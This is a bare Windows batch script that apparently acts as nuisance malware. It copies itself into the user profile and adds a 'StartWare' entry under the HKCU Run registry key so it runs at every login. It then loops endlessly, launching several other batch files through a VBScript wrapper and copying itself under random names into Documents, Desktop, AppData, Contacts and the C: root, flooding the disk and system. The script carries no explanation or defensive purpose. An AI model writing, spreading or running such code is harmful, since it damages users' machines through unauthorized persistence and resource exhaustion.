@echo off
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Captures\lolz.bat
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "StartWare" /t REG_SZ /d "%USERPROFILE%\Captures\lolz.bat" /f

:loop
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\filel.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\file.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\sigma.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\copy.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\startup.bat
wscript %PUBLIC%\vbs\file.vbs %PUBLIC%\sigma\lulz.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Documents\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Desktop\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\AppData\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat %USERPROFILE%\Contacts\mk%random%4.bat
copy %PUBLIC%\sigma\startup.bat C:\mk%random%4.bat
goto loop
